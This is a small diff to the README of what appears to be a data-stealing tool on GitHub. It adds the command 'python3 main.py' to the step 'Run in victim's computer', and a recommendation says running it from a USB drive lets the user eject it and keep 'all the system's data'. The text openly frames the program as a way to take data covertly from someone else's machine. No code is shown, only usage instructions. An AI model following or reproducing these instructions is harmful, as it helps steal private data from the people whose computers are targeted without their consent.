@@ -15,7 +15,7 @@
 :fire: &nbsp; ***How to run*** &nbsp; :fire:
 1. Download the file from github or with the "git clone" command.
 2. Install the items in requirements: "pip install -r requirements.txt"
-3. Run in victim's computer
+3. Run in victim's computer with: "python3 main.py"
 
 :point_right: &nbsp; ***Recommended:*** &nbsp; :point_left:
 - Use a USB/Flash Drive to run the Program. This way, once the program is finished, you can just eject the USB/Flash Drive and have all the system's data!
